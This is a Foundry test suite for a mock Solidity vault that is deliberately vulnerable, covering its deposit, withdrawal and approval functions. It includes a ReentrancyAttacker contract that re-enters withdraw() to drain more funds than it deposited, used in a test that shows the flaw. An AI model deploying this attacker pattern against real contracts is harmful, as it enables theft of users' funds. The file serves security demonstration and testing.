// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ArrhythmicVault} from "../src/mocks/ArrhythmicVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ArrhythmicVaultTest
 * @notice Tests for ArrhythmicVault - the intentionally vulnerable mock contract.
 *         Verifies the rhythm anomaly / reentrancy vulnerability exists for demo
 *         and validates deposit/withdrawal mechanics.
 */
contract ArrhythmicVaultTest is Test {
    ArrhythmicVault public protocol;

    address public user = address(0x1);
    address public attacker = address(0x2);

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function setUp() public {
        protocol = new ArrhythmicVault();
        vm.deal(user, 10 ether);
        vm.deal(attacker, 1 ether);
    }

    // ── deposit() ────────────────────────────────────────────────────────────

    function testDeposit() public {
        vm.prank(user);
        vm.expectEmit(true, false, false, true);
        emit Deposit(user, 1 ether);

        protocol.deposit{value: 1 ether}();

        assertEq(protocol.balances(user), 1 ether);
        assertEq(protocol.getContractBalance(), 1 ether);
    }

    function testDepositMultiple() public {
        vm.startPrank(user);
        protocol.deposit{value: 2 ether}();
        protocol.deposit{value: 3 ether}();
        vm.stopPrank();

        assertEq(protocol.balances(user), 5 ether);
        assertEq(protocol.getContractBalance(), 5 ether);
    }

    // ── receive() ────────────────────────────────────────────────────────────

    function testReceiveETH() public {
        vm.prank(user);
        (bool ok,) = address(protocol).call{value: 2 ether}("");
        assertTrue(ok);
        assertEq(protocol.balances(user), 2 ether);
    }

    // ── withdraw() ───────────────────────────────────────────────────────────

    function testWithdrawSuccess() public {
        vm.prank(user);
        protocol.deposit{value: 1 ether}();

        uint256 balanceBefore = user.balance;

        vm.prank(user);
        vm.expectEmit(true, false, false, true);
        emit Withdrawal(user, 1 ether);
        protocol.withdraw();

        assertEq(protocol.balances(user), 0);
        assertEq(user.balance, balanceBefore + 1 ether);
        assertEq(protocol.getContractBalance(), 0);
    }

    function testWithdrawRevertsWithNoBalance() public {
        vm.prank(user);
        vm.expectRevert("No balance");
        protocol.withdraw();
    }

    // ── getContractBalance() ─────────────────────────────────────────────────

    function testGetContractBalance() public {
        assertEq(protocol.getContractBalance(), 0);

        vm.prank(user);
        protocol.deposit{value: 5 ether}();

        assertEq(protocol.getContractBalance(), 5 ether);
    }

    // ── approveGuardian() ────────────────────────────────────────────────────

    function testApproveGuardian() public {
        MockApprovalToken token = new MockApprovalToken();
        address guardian = address(0xABCD);

        protocol.approveGuardian(address(token), guardian, 500 ether);

        assertEq(token.allowance(address(protocol), guardian), 500 ether);
    }

    // ── Reentrancy arrhythmia demonstration ──────────────────────────────────

    /**
     * @notice Demonstrates the reentrancy flaw.
     *         A malicious contract drains funds by re-entering withdraw()
     *         before the state update occurs.
     */
    function testReentrancyVulnerabilityExists() public {
        vm.prank(user);
        protocol.deposit{value: 5 ether}();

        ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(payable(address(protocol)));
        vm.deal(address(reentrancyAttacker), 1 ether);
        reentrancyAttacker.deposit{value: 1 ether}();

        uint256 contractBalanceBefore = protocol.getContractBalance();
        assertEq(contractBalanceBefore, 6 ether);

        reentrancyAttacker.attack();

        uint256 contractBalanceAfter = protocol.getContractBalance();
        uint256 attackerGain = address(reentrancyAttacker).balance - 1 ether;
        assertTrue(attackerGain > 0, "Reentrancy did not drain extra funds");
        assertTrue(contractBalanceAfter < contractBalanceBefore - 1 ether, "Reentrancy should drain more than deposited");
    }
}

// ── Minimal ERC20 for approveGuardian test ────────────────────────────────────
contract MockApprovalToken is IERC20 {
    mapping(address => mapping(address => uint256)) private _allowances;

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return false; }
}

// ── Reentrancy attacker contract ──────────────────────────────────────────────
contract ReentrancyAttacker {
    ArrhythmicVault public target;
    uint256 public attackCount;
    uint256 constant MAX_ATTACKS = 3;

    constructor(address payable _target) {
        target = ArrhythmicVault(_target);
    }

    function deposit() external payable {
        target.deposit{value: msg.value}();
    }

    function attack() external {
        attackCount = 0;
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }
}
